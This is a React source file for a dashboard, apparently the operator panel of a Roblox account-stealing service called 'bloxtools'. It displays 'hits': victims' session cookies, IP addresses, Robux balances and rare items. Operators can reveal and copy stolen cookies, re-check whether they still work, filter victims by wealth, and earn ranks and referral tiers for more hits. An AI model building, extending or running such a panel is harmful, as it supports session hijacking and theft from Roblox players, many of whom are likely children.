import React, { useEffect, useMemo, useRef, useState } from 'react';
import { useOutletContext } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';
import { Loader2, Eye, EyeOff, Copy, Crown, Skull, Volume2, VolumeX, Mic, BadgeCheck, Coins, Users, Search, RefreshCw, CheckCircle2, XCircle, Filter } from 'lucide-react';
import type { DashboardProfile } from './DashboardLayout';
import { getRank, getReferralTier, REFERRAL_TIERS } from '@/config/toolsConfig';
import hitSound from '@/assets/hit-sound.mp3';

interface HitRow {
  id: string;
  tool_type: string;
  roblox_username: string | null;
  roblox_robux: number | null;
  roblox_rap: number | null;
  roblox_premium: boolean | null;
  roblox_has_korblox: boolean | null;
  roblox_has_headless: boolean | null;
  roblox_voice_enabled: boolean | null;
  roblox_age_verified: boolean | null;
  roblox_gamepass_earnings: number | null;
  roblox_robux_spent: number | null;
  roblox_summary: number | null;
  roblox_headshot_url: string | null;
  cookie_preview: string | null;
  ip_address: string | null;
  is_valid: boolean | null;
  last_checked_at: string | null;
  created_at: string;
}

const SOUND_PREF_KEY = 'bloxtools:sound-enabled';

type ValidityFilter = 'all' | 'valid' | 'invalid' | 'unchecked';

const HitsPage = () => {
  const { profile } = useOutletContext<{ profile: DashboardProfile & { referral_count?: number } }>();
  const [hits, setHits] = useState<HitRow[] | null>(null);
  const [revealed, setRevealed] = useState<Record<string, boolean>>({});
  const [soundOn, setSoundOn] = useState(() => localStorage.getItem(SOUND_PREF_KEY) !== 'false');
  const [referralCount, setReferralCount] = useState<number>(0);
  const [search, setSearch] = useState('');
  const [toolFilter, setToolFilter] = useState<string>('all');
  const [minRobux, setMinRobux] = useState<string>('');
  const [validityFilter, setValidityFilter] = useState<ValidityFilter>('all');
  const [showFlags, setShowFlags] = useState({ korblox: false, headless: false, premium: false });
  const [rechecking, setRechecking] = useState(false);
  const [recheckingId, setRecheckingId] = useState<string | null>(null);
  const audioRef = useRef<HTMLAudioElement | null>(null);

  const SELECT_COLS = 'id, tool_type, roblox_username, roblox_robux, roblox_rap, roblox_premium, roblox_has_korblox, roblox_has_headless, roblox_voice_enabled, roblox_age_verified, roblox_gamepass_earnings, roblox_robux_spent, roblox_summary, roblox_headshot_url, cookie_preview, ip_address, is_valid, last_checked_at, created_at';

  useEffect(() => {
    supabase
      .from('profiles')
      .select('referral_count')
      .eq('id', profile.id)
      .maybeSingle()
      .then(({ data }) => setReferralCount((data as any)?.referral_count ?? 0));
  }, [profile.id]);

  const refresh = async () => {
    const { data, error } = await supabase
      .from('hits')
      .select(SELECT_COLS)
      .eq('owner_id', profile.id)
      .order('created_at', { ascending: false })
      .limit(500);
    if (error) toast.error(error.message);
    setHits((data as HitRow[]) ?? []);
  };

  useEffect(() => { refresh(); }, [profile.id]);

  useEffect(() => {
    audioRef.current = new Audio(hitSound);
    audioRef.current.volume = 0.5;

    const channel = supabase
      .channel(`hits-owner-${profile.id}`)
      .on(
        'postgres_changes',
        { event: 'INSERT', schema: 'public', table: 'hits', filter: `owner_id=eq.${profile.id}` },
        (payload) => {
          const newHit = payload.new as HitRow;
          setHits((prev) => {
            if (prev?.some((h) => h.id === newHit.id)) return prev;
            return prev ? [newHit, ...prev] : [newHit];
          });
          toast.success(`New hit: ${newHit.roblox_username || 'Unknown'} (${newHit.tool_type})`);
          if (localStorage.getItem(SOUND_PREF_KEY) !== 'false') {
            audioRef.current?.play().catch(() => {});
          }
        }
      )
      .on(
        'postgres_changes',
        { event: 'UPDATE', schema: 'public', table: 'hits', filter: `owner_id=eq.${profile.id}` },
        (payload) => {
          const updated = payload.new as HitRow;
          setHits((prev) => {
            if (!prev) return [updated];
            const exists = prev.some((h) => h.id === updated.id);
            if (exists) {
              return prev.map((h) => (h.id === updated.id ? updated : h));
            }
            // Upsert that hit a conflict — treat as a new hit for this user
            toast.success(`New hit: ${updated.roblox_username || 'Unknown'} (${updated.tool_type})`);
            if (localStorage.getItem(SOUND_PREF_KEY) !== 'false') {
              audioRef.current?.play().catch(() => {});
            }
            return [updated, ...prev];
          });
        }
      )
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, [profile.id]);

  const toggleSound = () => {
    const next = !soundOn;
    setSoundOn(next);
    localStorage.setItem(SOUND_PREF_KEY, String(next));
    if (next) audioRef.current?.play().catch(() => {});
  };

  const tier = getReferralTier(referralCount);
  const boostPerReferral = tier.current.boostPerReferral;

  const stats = useMemo(() => {
    if (!hits) return null;
    let robux = 0, rap = 0, korblox = 0, headless = 0, gamepass = 0;
    for (const h of hits) {
      robux += h.roblox_robux ?? 0;
      rap += h.roblox_rap ?? 0;
      gamepass += h.roblox_gamepass_earnings ?? 0;
      if (h.roblox_has_korblox) korblox++;
      if (h.roblox_has_headless) headless++;
    }
    return { total: hits.length, robux, rap, korblox, headless, gamepass };
  }, [hits]);

  const toolTypes = useMemo(() => {
    if (!hits) return [];
    return Array.from(new Set(hits.map((h) => h.tool_type))).sort();
  }, [hits]);

  const filteredHits = useMemo(() => {
    if (!hits) return [];
    const q = search.trim().toLowerCase();
    const min = parseInt(minRobux) || 0;
    return hits.filter((h) => {
      if (q && !(h.roblox_username?.toLowerCase().includes(q) || h.ip_address?.toLowerCase().includes(q))) return false;
      if (toolFilter !== 'all' && h.tool_type !== toolFilter) return false;
      if (min > 0 && (h.roblox_robux ?? 0) < min) return false;
      if (showFlags.korblox && !h.roblox_has_korblox) return false;
      if (showFlags.headless && !h.roblox_has_headless) return false;
      if (showFlags.premium && !h.roblox_premium) return false;
      if (validityFilter === 'valid' && h.is_valid !== true) return false;
      if (validityFilter === 'invalid' && h.is_valid !== false) return false;
      if (validityFilter === 'unchecked' && h.is_valid !== null) return false;
      return true;
    });
  }, [hits, search, toolFilter, minRobux, showFlags, validityFilter]);

  const recheckAll = async () => {
    setRechecking(true);
    try {
      const { data, error } = await supabase.functions.invoke('recheck-cookies', { body: {} });
      if (error) throw error;
      toast.success(`Checked ${data.checked}: ${data.valid} valid, ${data.invalid} dead`);
      await refresh();
    } catch (e: any) {
      toast.error(e.message ?? 'Re-check failed');
    } finally {
      setRechecking(false);
    }
  };

  const recheckOne = async (id: string) => {
    setRecheckingId(id);
    try {
      const { data, error } = await supabase.functions.invoke('recheck-cookies', { body: { hitId: id } });
      if (error) throw error;
      toast.success(data.valid > 0 ? 'Cookie still valid ✅' : 'Cookie is dead ❌');
      await refresh();
    } catch (e: any) {
      toast.error(e.message ?? 'Re-check failed');
    } finally {
      setRecheckingId(null);
    }
  };

  if (hits === null || !stats) {
    return (
      <div className="flex justify-center py-12">
        <Loader2 className="h-6 w-6 animate-spin text-blox-teal" />
      </div>
    );
  }

  const effectiveTotal = stats.total + referralCount * boostPerReferral;
  const rank = getRank(effectiveTotal);

  const StatCard = ({ label, value }: { label: string; value: React.ReactNode }) => (
    <div className="blox-card p-4">
      <div className="text-xs uppercase text-gray-400">{label}</div>
      <div className="text-xl font-bold mt-1">{value}</div>
    </div>
  );

  const copy = (txt: string) => { navigator.clipboard.writeText(txt); toast.success('Copied'); };

  const referralLink = `${window.location.origin}/signup?ref=${profile.username}`;

  return (
    <div className="space-y-6">
      <div className="blox-card p-5 flex items-center gap-4">
        <div className="flex-1">
          <div className="text-sm text-gray-400">Your rank</div>
          <div className="text-2xl font-bold text-blox-teal">{rank.current.name}</div>
          {rank.next && (
            <div className="text-xs text-gray-500 mt-1">
              {rank.next.min - effectiveTotal} hits until <span className="text-gray-300">{rank.next.name}</span>
            </div>
          )}
          {referralCount > 0 && (
            <div className="text-xs text-blox-teal/80 mt-1">
              Includes +{referralCount * boostPerReferral} from {referralCount} referral{referralCount === 1 ? '' : 's'} ({boostPerReferral}/ref)
            </div>
          )}
        </div>
        <button
          onClick={toggleSound}
          className="p-2 rounded-md hover:bg-white/5 text-gray-400 hover:text-blox-teal"
          title={soundOn ? 'Mute hit sounds' : 'Unmute hit sounds'}
        >
          {soundOn ? <Volume2 className="h-5 w-5" /> : <VolumeX className="h-5 w-5" />}
        </button>
      </div>

      {/* Referral tier card */}
      <div className="blox-card p-4">
        <div className="flex items-center gap-3 mb-3">
          <Users className="h-5 w-5 text-blox-teal shrink-0" />
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-sm font-semibold">Referral Tier:</span>
              <span className={`text-sm font-bold ${tier.current.color}`}>{tier.current.name}</span>
              <span className="text-xs text-gray-400">· {tier.current.perk}</span>
            </div>
            <div className="text-xs text-gray-400 mt-0.5">
              {referralCount} referral{referralCount === 1 ? '' : 's'}
              {tier.next && <> · {tier.next.minReferrals - referralCount} more to reach <span className={tier.next.color}>{tier.next.name}</span></>}
            </div>
          </div>
          <button onClick={() => copy(referralLink)} className="p-2 rounded-md hover:bg-white/5 text-gray-400 hover:text-blox-teal" title="Copy referral link">
            <Copy className="h-4 w-4" />
          </button>
        </div>
        <div className="grid grid-cols-5 gap-1">
          {REFERRAL_TIERS.map((t) => {
            const reached = referralCount >= t.minReferrals;
            return (
              <div key={t.name} className={`text-[10px] text-center p-2 rounded border ${reached ? 'border-blox-teal/40 bg-blox-teal/10' : 'border-white/5 bg-black/20 opacity-50'}`}>
                <div className={`font-bold ${reached ? t.color : 'text-gray-500'}`}>{t.name}</div>
                <div className="text-gray-500">{t.minReferrals}+</div>
              </div>
            );
          })}
        </div>
        <code className="block mt-3 text-[11px] bg-black/40 px-2 py-1 rounded font-mono truncate text-gray-400">{referralLink}</code>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-6 gap-3">
        <StatCard label="Total Hits" value={stats.total} />
        <StatCard label="Robux" value={stats.robux.toLocaleString()} />
        <StatCard label="RAP" value={stats.rap.toLocaleString()} />
        <StatCard label="Gamepass R$" value={stats.gamepass.toLocaleString()} />
        <StatCard label="Korblox" value={<span className="flex items-center gap-1"><Skull className="h-4 w-4 text-red-400" />{stats.korblox}</span>} />
        <StatCard label="Headless" value={<span className="flex items-center gap-1"><Crown className="h-4 w-4 text-yellow-400" />{stats.headless}</span>} />
      </div>

      {/* Filters */}
      <div className="blox-card p-4 space-y-3">
        <div className="flex items-center gap-2 text-sm font-semibold text-gray-300">
          <Filter className="h-4 w-4" /> Search & Filters
          <span className="ml-auto text-xs text-gray-500 font-normal">
            {filteredHits.length} of {hits.length}
          </span>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-4 gap-2">
          <div className="relative md:col-span-2">
            <Search className="absolute left-2 top-2.5 h-4 w-4 text-gray-500" />
            <input
              type="text"
              placeholder="Search username or IP…"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="w-full bg-black/40 border border-white/10 rounded pl-8 pr-3 py-1.5 text-sm focus:outline-none focus:border-blox-teal"
            />
          </div>
          <select
            value={toolFilter}
            onChange={(e) => setToolFilter(e.target.value)}
            className="bg-black/40 border border-white/10 rounded px-2 py-1.5 text-sm focus:outline-none focus:border-blox-teal"
          >
            <option value="all">All tools</option>
            {toolTypes.map((t) => <option key={t} value={t}>{t}</option>)}
          </select>
          <input
            type="number"
            placeholder="Min Robux"
            value={minRobux}
            onChange={(e) => setMinRobux(e.target.value)}
            className="bg-black/40 border border-white/10 rounded px-3 py-1.5 text-sm focus:outline-none focus:border-blox-teal"
          />
        </div>
        <div className="flex items-center gap-2 flex-wrap text-xs">
          <select
            value={validityFilter}
            onChange={(e) => setValidityFilter(e.target.value as ValidityFilter)}
            className="bg-black/40 border border-white/10 rounded px-2 py-1 focus:outline-none focus:border-blox-teal"
          >
            <option value="all">All cookies</option>
            <option value="valid">Valid only</option>
            <option value="invalid">Dead only</option>
            <option value="unchecked">Unchecked</option>
          </select>
          {(['korblox', 'headless', 'premium'] as const).map((flag) => (
            <label key={flag} className="flex items-center gap-1 px-2 py-1 rounded bg-black/40 border border-white/10 cursor-pointer hover:border-blox-teal/40">
              <input
                type="checkbox"
                checked={showFlags[flag]}
                onChange={(e) => setShowFlags((f) => ({ ...f, [flag]: e.target.checked }))}
                className="accent-blox-teal"
              />
              {flag.charAt(0).toUpperCase() + flag.slice(1)}
            </label>
          ))}
          <button
            onClick={recheckAll}
            disabled={rechecking}
            className="ml-auto flex items-center gap-1 px-3 py-1 rounded bg-blox-teal/20 hover:bg-blox-teal/30 text-blox-teal disabled:opacity-50"
          >
            {rechecking ? <Loader2 className="h-3 w-3 animate-spin" /> : <RefreshCw className="h-3 w-3" />}
            Re-check all cookies
          </button>
        </div>
      </div>

      <div>
        <h2 className="text-lg font-semibold mb-2">Hits</h2>
        {filteredHits.length === 0 ? (
          <div className="blox-card p-6 text-center text-gray-400">
            {hits.length === 0 ? 'No hits yet.' : 'No hits match your filters.'}
          </div>
        ) : (
          <div className="space-y-3">
            {filteredHits.map((h) => (
              <div key={h.id} className="blox-card p-4">
                <div className="flex items-start gap-4">
                  {h.roblox_headshot_url ? (
                    <img src={h.roblox_headshot_url} alt="" className="w-20 h-20 rounded-md bg-black/40 shrink-0 object-cover" />
                  ) : (
                    <div className="w-20 h-20 rounded-md bg-black/40 shrink-0" />
                  )}
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-2 flex-wrap">
                      <div className="font-semibold truncate flex items-center gap-2">
                        {h.roblox_username || 'Unknown user'}{' '}
                        <span className="text-gray-400 text-sm font-normal">— {h.tool_type}</span>
                        {h.roblox_age_verified && <BadgeCheck className="h-4 w-4 text-blox-teal" aria-label="Age verified" />}
                        {h.roblox_voice_enabled && <Mic className="h-4 w-4 text-green-400" aria-label="Voice enabled" />}
                        {h.is_valid === true && <CheckCircle2 className="h-4 w-4 text-green-400" aria-label="Cookie valid" />}
                        {h.is_valid === false && <XCircle className="h-4 w-4 text-red-400" aria-label="Cookie dead" />}
                      </div>
                      <div className="text-xs text-gray-500">{new Date(h.created_at).toLocaleString()}</div>
                    </div>
                    <div className="text-sm text-gray-400 mt-2 grid grid-cols-2 md:grid-cols-3 gap-x-4 gap-y-1">
                      <span>Robux: <span className="text-gray-200">{h.roblox_robux ?? '?'}</span></span>
                      <span>RAP: <span className="text-gray-200">{h.roblox_rap ?? '?'}</span></span>
                      <span>Premium: <span className="text-gray-200">{h.roblox_premium === null ? '?' : h.roblox_premium ? 'Yes' : 'No'}</span></span>
                      <span className="flex items-center gap-1"><Coins className="h-3 w-3" />Gamepass: <span className="text-gray-200">{h.roblox_gamepass_earnings?.toLocaleString() ?? '?'}</span></span>
                      <span>Spent: <span className="text-gray-200">{h.roblox_robux_spent?.toLocaleString() ?? '?'}</span></span>
                      <span>Summary: <span className={h.roblox_summary !== null && h.roblox_summary < 0 ? 'text-red-300' : 'text-gray-200'}>{h.roblox_summary !== null ? `${h.roblox_summary >= 0 ? '+' : ''}${h.roblox_summary.toLocaleString()}` : '?'}</span></span>
                      <span>Korblox: <span className="text-gray-200">{h.roblox_has_korblox === null ? '?' : h.roblox_has_korblox ? 'Yes' : 'No'}</span></span>
                      <span>Headless: <span className="text-gray-200">{h.roblox_has_headless === null ? '?' : h.roblox_has_headless ? 'Yes' : 'No'}</span></span>
                      <span>Voice: <span className="text-gray-200">{h.roblox_voice_enabled === null ? '?' : h.roblox_voice_enabled ? 'Yes' : 'No'}</span></span>
                      <span>Verified: <span className="text-gray-200">{h.roblox_age_verified === null ? '?' : h.roblox_age_verified ? 'Yes' : 'No'}</span></span>
                      <span>IP: <span className="text-gray-200">{h.ip_address ?? '?'}</span></span>
                    </div>
                    {h.cookie_preview && (
                      <div className="mt-3 flex items-center gap-2 flex-wrap">
                        <span className="text-xs text-gray-500">Cookie:</span>
                        <code className="text-xs bg-black/40 px-2 py-1 rounded font-mono">
                          {revealed[h.id] ? h.cookie_preview : '••••••••' + h.cookie_preview.slice(-4)}
                        </code>
                        <button onClick={() => setRevealed((r) => ({ ...r, [h.id]: !r[h.id] }))} className="text-gray-400 hover:text-blox-teal" title={revealed[h.id] ? 'Hide' : 'Show'}>
                          {revealed[h.id] ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                        </button>
                        <button onClick={() => copy(h.cookie_preview!)} className="text-gray-400 hover:text-blox-teal" title="Copy">
                          <Copy className="h-4 w-4" />
                        </button>
                        <button
                          onClick={() => recheckOne(h.id)}
                          disabled={recheckingId === h.id}
                          className="text-gray-400 hover:text-blox-teal flex items-center gap-1 text-xs"
                          title="Re-check this cookie"
                        >
                          {recheckingId === h.id ? <Loader2 className="h-3 w-3 animate-spin" /> : <RefreshCw className="h-3 w-3" />}
                          Recheck
                        </button>
                        {h.last_checked_at && (
                          <span className="text-[10px] text-gray-600 ml-auto">checked {new Date(h.last_checked_at).toLocaleString()}</span>
                        )}
                      </div>
                    )}
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default HitsPage;
